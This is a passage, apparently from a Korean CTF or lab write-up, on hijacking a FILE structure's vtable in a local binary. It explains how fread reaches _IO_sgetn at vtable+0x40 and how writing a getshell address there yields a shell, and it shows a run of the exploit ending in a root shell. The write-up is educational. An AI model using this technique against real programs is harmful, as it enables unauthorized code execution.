구성한 가짜 파일 구조체에서 중요한 것은 table을 `0x6011b0` 주소로 조작한 것이다. `fread` 함수는 vtable의 주소로부터 `0x40` 만큼 떨어진 함수를 호출하는데, 그 이유는 다음과 같다.

```c
static const struct _IO_jump_t jumps =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT (finish, method_finish),
  JUMP_INIT (overflow, method_overflow),
  JUMP_INIT (underflow, method_underflow),
  JUMP_INIT (uflow, method_uflow),
  JUMP_INIT (pbackfail, method_pbackfail),
  JUMP_INIT (xsputn, method_xsputn),
  JUMP_INIT (xsgetn, method_xsgetn),          // here
  JUMP_INIT (seekoff, method_seekoff),
  JUMP_INIT (seekpos, method_seekpos),
  JUMP_INIT (setbuf, method_setbuf),
  JUMP_INIT (sync, method_sync),
  JUMP_INIT (doallocate, method_doallocate),
  JUMP_INIT (read, method_read),
  JUMP_INIT (write, method_write),
  JUMP_INIT (seek, method_seek),
  JUMP_INIT (close, method_close),
  JUMP_INIT (stat, method_stat),
  JUMP_INIT (showmanyc, method_showmanyc),
  JUMP_INIT (imbue, method_imbue)
};
```

앞서 말했듯이 `fread` 함수가 호출되면 `_IO_sgetn` 함수가 호출된다. `_IO_jump` 구조체를 보면 8번째에 해당 함수가 존재하기 때문에 `vtable + 0x40` 를 참조하여 호출하게 된다.

구성한 가짜 파일 구조체에 따르면 `0x6011b0 + 0x40` 위치의 함수가 호출되므로 `0x6011f0` 주소에 `getshell` 함수 주소를 입력하면 쉘을 획득할 수 있다.

```zsh
╭─root@f89dba98d1b0 ~
╰─➤  python3 fp_vtable.py
[+] Starting local process './fp_vtable': pid 534
[*] '/root/fp_vtable'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
b'Name:'
[*] Switching to interactive mode
 $ id
uid=0(root) gid=0(root) groups=0(root)
$
```